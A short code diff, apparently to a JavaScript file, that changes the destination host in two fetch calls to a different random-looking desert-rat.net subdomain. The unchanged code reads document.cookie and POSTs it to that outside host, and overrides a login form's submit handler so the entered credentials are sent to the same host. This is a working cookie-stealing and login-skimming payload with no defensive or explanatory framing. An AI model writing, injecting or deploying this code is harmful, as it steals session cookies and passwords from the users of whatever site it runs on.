@@ -5,7 +5,7 @@ console.log(document.domain);
 
 let data = document.cookie;
 
-fetch("https://dam5j34p92lis85gpj50s511hyt4rua9u.desert-rat.net", {
+fetch("https://dam8opsp92lp2rjfbin0w6b4gjdnpct5t.desert-rat.net", {
   method: "POST",
   body: data,
 });
@@ -13,7 +13,7 @@ fetch("https://dam5j34p92lis85gpj50s511hyt4rua9u.desert-rat.net", {
 login.onsubmit = async (e) => {
     e.preventDefault();
 
-    let response = await fetch('https://dam5j34p92lis85gpj50s511hyt4rua9u.desert-rat.net', {
+    let response = await fetch('https://dam8opsp92lp2rjfbin0w6b4gjdnpct5t.desert-rat.net', {
       method: 'POST',
       body: new FormData(login)
     });
